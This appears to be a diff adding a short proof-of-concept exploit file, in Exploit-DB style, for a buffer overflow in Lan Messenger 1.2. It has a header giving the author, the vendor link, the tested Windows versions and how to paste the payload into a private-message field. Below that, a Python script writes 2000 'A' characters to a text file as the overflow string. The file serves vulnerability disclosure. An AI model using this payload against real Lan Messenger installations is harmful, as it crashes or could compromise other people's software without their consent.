@@ -1,0 +1,25 @@
+# Exploit Title: Lan Messenger Version 1.2 Buffer Overflow vulnerability - UNICODE(POC)
+# Date: 09-05-2013
+# Exploit Author: ariarat 
+# Vendor Homepage: http://lmadhavan.com
+# Software Link: http://lmadhavan.com/software/archive/lanmsg12.zip
+# Version: 1.2 & may be old versions!
+# Tested on: [ Windows 7 & windows XP sp2,sp3]
+#============================================================================================
+# After creating txt file,open created file and copy the AAA... string to clipboard and
+# then paste in Public Chat's send PM section or in any window for sending PM to others. 
+#
+#============================================================================================
+# Contact :
+#------------------
+# Web Page : http://ariarat.blogspot.com
+# Email    : mehdi.esmaeelpour@gmail.com
+#============================================================================================
+
+#!/usr/bin/python
+
+filename="string.txt"
+buffer = "\x41" * 2000
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
